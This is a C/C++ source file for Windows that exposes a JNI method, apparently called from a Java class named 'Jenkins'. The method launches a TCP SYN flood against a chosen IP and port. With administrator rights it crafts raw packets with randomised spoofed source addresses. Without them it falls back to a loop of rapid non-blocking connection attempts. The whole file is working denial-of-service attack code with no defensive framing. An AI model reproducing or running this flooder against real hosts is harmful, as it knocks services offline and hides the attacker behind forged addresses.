#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <process.h>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")

#define PACKET_SIZE 40

// IP header structure
struct iphdr {
    uint8_t ihl:4, version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

// TCP header structure
struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
    struct tcphdr tcp;
};

struct thread_data {
    const char* target_ip;
    int target_port;
    int bytes_per_second;
    volatile bool* stop_attack;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

DWORD WINAPI send_syn_packets(LPVOID arg) {
    struct thread_data *data = (struct thread_data *)arg;
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        printf("Error creating socket. Error number: %d\n", WSAGetLastError());
        return 1;
    }

    char datagram[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->target_port);
    sin.sin_addr.s_addr = inet_addr(data->target_ip);

    memset(datagram, 0, PACKET_SIZE);

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->daddr = sin.sin_addr.s_addr;

    // TCP Header
    tcph->dest = htons(data->target_port);
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)&one, sizeof(one)) < 0) {
        printf("Error setting IP_HDRINCL. Error number: %d\n", WSAGetLastError());
        closesocket(s);
        return 1;
    }

    DWORD start_time = GetTickCount();
    DWORD bytes_sent = 0;
    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
    int packets_sent = 0;

    while (!(*(data->stop_attack))) {
        // Randomize source IP and ports
        iph->saddr = htonl(rand());
        iph->id = htons(rand());
        tcph->source = htons(rand());
        tcph->seq = rand();

        iph->check = 0;
        tcph->check = 0;
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("sendto() failed. Error number: %d\n", WSAGetLastError());
        } else {
            packets_sent++;
            bytes_sent += packet_size;
        }

        // Rate limiting
        if (bytes_sent >= data->bytes_per_second) {
            DWORD elapsed_time = GetTickCount() - start_time;
            if (elapsed_time < 1000) {
                Sleep(1000 - elapsed_time);
            }
            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
            start_time = GetTickCount();
            bytes_sent = 0;
            packets_sent = 0;
        }
    }

    closesocket(s);
    return 0;
}

DWORD WINAPI send_syn_packets_non_privileged(LPVOID arg) {
    struct thread_data *data = (struct thread_data *)arg;
    DWORD start_time = GetTickCount();
    DWORD bytes_sent = 0;
    int packets_sent = 0;

    while (!(*(data->stop_attack))) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            continue;
        }

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(data->target_port);
        sin.sin_addr.s_addr = inet_addr(data->target_ip);

        u_long iMode = 1;
        ioctlsocket(s, FIONBIO, &iMode);

        connect(s, (struct sockaddr *)&sin, sizeof(sin));

        closesocket(s);

        packets_sent++;
        bytes_sent += sizeof(struct tcphdr) + sizeof(struct iphdr);

        // Rate limiting
        if (bytes_sent >= data->bytes_per_second) {
            DWORD elapsed_time = GetTickCount() - start_time;
            if (elapsed_time < 1000) {
                Sleep(1000 - elapsed_time);
            }
            printf("Sent %d packets, %d bytes\n", packets_sent, bytes_sent);
            start_time = GetTickCount();
            bytes_sent = 0;
            packets_sent = 0;
        }
    }

    return 0;
}

JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jint bytesPerSecond) {
    printf("tcpSynFlood method called\n");
    const char *ip = env->GetStringUTFChars(targetIp, 0);
    struct thread_data data;
    data.target_ip = ip;
    data.target_port = targetPort;
    data.bytes_per_second = bytesPerSecond;
    volatile bool stop_attack = false;
    data.stop_attack = &stop_attack;

    HANDLE thread;
    BOOL isElevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (isElevated) {
        thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
    } else {
        thread = CreateThread(NULL, 0, send_syn_packets_non_privileged, (LPVOID)&data, 0, NULL);
    }

    if (thread == NULL) {
        printf("Failed to create thread. Error: %d\n", GetLastError());
        env->ReleaseStringUTFChars(targetIp, ip);
        return JNI_FALSE;
    }

    printf("Thread created successfully\n");

    // Wait for Java to call stopAttack()
    jclass cls = env->GetObjectClass(obj);
    jfieldID fid = env->GetFieldID(cls, "stopAttack", "Z");
    while (!env->GetBooleanField(obj, fid)) {
        Sleep(100); // Sleep for 100ms
    }

    stop_attack = true;
    printf("Stop attack flag set to true\n");
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    printf("Thread closed\n");

    env->ReleaseStringUTFChars(targetIp, ip);
    printf("tcpSynFlood method completed\n");
    return isElevated ? JNI_TRUE : JNI_FALSE;
}
